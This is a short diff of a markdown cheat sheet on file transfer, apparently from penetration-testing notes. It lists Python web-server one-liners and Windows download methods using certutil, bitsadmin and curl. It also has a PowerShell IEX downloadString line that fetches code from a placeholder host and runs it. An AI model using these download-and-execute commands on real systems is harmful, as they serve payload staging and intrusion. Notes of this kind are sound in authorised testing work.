@@ -1,20 +1,27 @@
 # File transfer
 
 ## Python web server
-Python we server
+
+### python2
 python -m SimpleHTTPServer 9000
+
+### python3
 python3 -m http.server 9000
 
 ## Windows file transfer
+
+### certutil
 certutil.exe —urlcache —f http://<webpage>/file.txt file.txt
 
 certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
 
+### bitsadmin
 bitsadmin /transfer myDownloadJob /download /priority normal https://www.hkrefill.com/images/billboard/cheapselftake.gif "C:\Users\helpdesk\Downloads\cheap.gif"
 
+### curl
 curl  "https://www.hkrefill.com/images/billboard/cheapselftake.gif" --output abc.gif
 
-
+### powershell
 powershell "IEX(New-Object Net.WebClient).downloadString('http://<webpage>:8000/file.txt')"
 
 ## Linux file transfer
